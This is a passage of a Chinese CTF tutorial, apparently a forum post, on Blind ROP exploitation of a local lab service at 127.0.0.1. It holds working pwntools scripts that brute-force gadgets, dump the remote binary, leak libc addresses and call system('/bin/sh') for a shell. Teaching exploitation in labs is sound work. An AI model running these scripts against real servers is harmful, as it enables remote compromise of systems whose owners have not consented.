
不断尝试，如果没有接收到“No password”那就代表程序出错，栈溢出覆盖到了返回地址，这时候就退出，其它错误也退出。最后爆破出来为72个字节，那么`buf`的缓冲区就是72-8(`rbp`)=64个字节。(总感觉这里有点问题，如果真是blind，那么肯定也不知道是32位还是64位啊，那么就应该两种方案都要尝试一下吧)

## 3. 寻找可以使得程序挂起的 `stop_gadget`
这个`stop_gadget`是什么不重要，只要能让程序不崩溃，能够在之后探索其它可以`rop`的时候接收到正确的反馈，那么是什么都可以。

```
#注释头



def get_stop_addr(buf_size):

    addr = 0x400000

    while True:

        sleep(0.1)#缓冲

        addr += 1

        payload = "A"*buf_size

        payload += p64(addr)#probe_addr

        try:

            sh = remote('127.0.0.1', 10001)

            sh.recvline()

            sh.sendline(payload)

            sh.recvline()

            sh.close()

            log.info("stop address: 0x%x" % addr)

            return addr

        except EOFError as e:#crash and restart

            sh.close()

            log.info("bad: 0x%x" % addr)

        except:#other error

            log.info("Can't connect")

            addr -= 1
```

## 4. 得到 `stop_addr` 之后，就可以继续探索其它的 `rop_gadget`，这里寻找万能 `gadget` 的六个 `pop` 的地方：

```
#注释头



def get_gadgets_addr(buf_size, stop_addr):

    addr = stop_addr

    while True:

        sleep(0.1)

        addr += 1

        payload = "A"*buf_size

        payload += p64(addr)

        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) +

        p64(6)

        payload += p64(stop_addr)

        try:

            p = remote('127.0.0.1', 10001)

            p.recvline()

            p.sendline(payload)

            p.recvline()

            p.close()

            log.info("find address: 0x%x" % addr)

            try: # check

                payload = "A"*buf_size

                payload += p64(addr)

                payload += p64(1) + p64(2) + p64(3) + p64(4) + p

                64(5) + p64(6)

                #Six pop without stop_addr

                p = remote('127.0.0.1', 10001)

                p.recvline()

                p.sendline(payload)

                p.recvline()

                p.close()

                log.info("bad address: 0x%x" % addr)

                #Not crash,Bad addr.

            except:#Crash,success addr

                p.close()

                log.info("gadget address: 0x%x" % addr)

                return addr

        except EOFError as e:

            p.close()

            log.info("bad: 0x%x" % addr)

        except:

            log.info("Can't connect")

            addr -= 1
```

找到之后，需要再次检查一下，用来确定是不是万能`gadget`，因为如果有程序六个`pop`之后不`retn`，那就不是万能`gadget`。因为需要`dump`二进制文件，所以需要万能`gadget`中的`Pop rdi;ret`这个`gadget`来`dump`文件。

## 5. 寻找 `puts` 函数的 `plt` 表，方便之后调用 `puts` 函数和 `pop rdi;ret` 这个 `gadget` 来 `dump` 二进制文件。

```
#注释头



def get_puts_addr(buf_size, rdi_ret, stop_gadget):

    addr = 0x400000

    while 1:

        print hex(addr)

        sh = remote('127.0.0.1', 10001)

        sh.recvuntil('password?\n')

        payload = 'A' * buf_size + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)

        #call put to print the head of ELF.

        sh.sendline(payload)

        try:

            content = sh.recv()

            if content.startswith('\x7fELF'):

                print("find puts@plt addr: 0x%x"%addr)

                return addr

            sh.close()

            addr += 1

        except EOFError as e:

            sh.close()

            log.info("bad: 0x%x" % addr)

        except:

            log.info("Can't connect")

            addr -= 1
```

这里实际上找出来的地址并不是`puts`函数的`plt`表地址，而是在`puts`的`plt`表前面一点的内容，但是这一小段内容不影响栈和`rdi`寄存器，所以没什么影响。

## 6. 利用 `puts` 函数和 `pop rdi;ret` 来 `dump` 二进制文件：

```
#注释头



def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):

    pop_rdi = gadgets_addr + 9 # pop rdi; ret

    result = ""

    while start_addr < end_addr:

        #print result.encode('hex')

        sleep(0.1)

        payload = "A"*buf_size

        payload += p64(pop_rdi)

        payload += p64(start_addr)

        payload += p64(puts_plt)

        payload += p64(stop_addr)

        try:

            sh = remote('127.0.0.1', 10001)

            sh.recvline()

            sh.sendline(payload)

            data = sh.recv(timeout=0.1) 

            #timeout makes sure to recive all bytes

            if data == "\n":#data = \x00

                data = "\x00"

            elif data[-1] == "\n":

            #data = xxxxx\n\x00,data = \n\x00,data = xxxxx\x00

                data = data[:-1]

            log.info("leaking: 0x%x --> %s" % (start_addr,(data or '').encode('hex')))

            result += data

            start_addr += len(data)

            sh.close()

        except:

            log.info("Can't connect")

    return result
```

由于`puts`函数通过`\x00`进行截断，不会输出`\x00`，并且会在每一次输出末尾加上换行符`\x0a`，所以有一些特殊情况需要做一些处理，比如单独的`\x00`、` \x0a`等。首先当然是先去掉末尾`puts`自动加上的`\n`，然后如果`recv`到一个`\n`，说明内存中是`\x00`，如果`recv`到一个`\n\n`，说明内存中是`\x0a`。`p.recv(timeout=0.1)`是由于函数本身的设定，如果有`\n\n`，它很可能在收到第一个`\n`时就返回了，加上参数可以让它全部接收完。

## 7. 得到二进制文件后就是常规操作了，利用 `Dynelf` 或者 `LibcSearcher` 和 `puts` 函数找到 `system` 函数和 `binsh` 实际位置，之后通过 `pop rdi;ret` 来为 `system` 函数赋参数从而 `getshell`。

```
#注释头



sh = remote('127.0.0.1', 10001)

sh.recvuntil('password?\n')

payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(

stop_gadget)

sh.sendline(payload)

data = sh.recvuntil('\nWelCome', drop=True)

puts_addr = u64(data.ljust(8, '\x00'))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')

system_addr = libc_base + libc.dump('system')

binsh_addr = libc_base + libc.dump('str_bin_sh')

payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(

system_addr) + p64(stop_gadget)

sh.sendline(payload)

sh.interactive()
```

这里的`libcSearcher`有时候不太好用，查到的`libc`不符合，或者是不对。还是`DynElf`好用一些，比较准确，并且由于是`puts`函数打印，所以可能需要单个字符来判断。但实际上64位条件下的`got`表中的地址一定是0x00007fxxxxxxxxxx，所以如果是大端情况，那么`puts`函数一定会截断，接收到的只会是xxxxxxxxxx7f和0a所以其实只要判断到换行符的时候就可以。

```
#注释头



def leak(address):

    data = ""

    c=""

    up = ""

    payload = 'a' * length + p64(rdi_ret) + p64(address) + p64(puts_plt) + p64(stop_gadget)

    sh.recvuntil('password?\n')

    sh.send(payload)

    while True:

        c = p.recv(1)

        if up == '\n' and c == "W":  

            data = data[:-1]                     

            data += "\x00"

            break

        else:

            data += c

        up = c

    data=data[:7]#实际有效地址只有6个字符

    log.info("%#x => %s" % (address, (data or '').encode('hex')))

    return data





dynelf = DynELF(leak, elf=ELF("./brop"))

system_addr = dynelf.lookup("__libc_system", "libc")
```

但是`DynElf`好像不能找`binsh`字符串，还是感觉`libcsearcher`好用点。

### 参考资料：
[c42K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4K9h3E0A6i4K6u0W2P5o6p5H3M7$3g2U0i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6K6N6r3q4U0K9$3!0$3k6i4u0X3L8r3!0%4i4K6u0r3L8h3g2V1K9i4g2E0i4K6u0V1M7X3!0H3i4K6u0V1P5X3S2Q4x3V1k6Q4x3U0y4T1M7X3!0H3](https://bbs.kanxue.com/elink@faeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4K9h3E0A6i4K6u0W2P5o6p5H3M7$3g2U0i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6K6N6r3q4U0K9$3!0$3k6i4u0X3L8r3!0%4i4K6u0r3L8h3g2V1K9i4g2E0i4K6u0V1M7X3!0H3i4K6u0V1P5X3S2Q4x3V1k6Q4x3U0y4T1M7X3!0H3)

ctf-all-in-one

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2021-8-8 09:10

被PIG-007编辑

，原因：
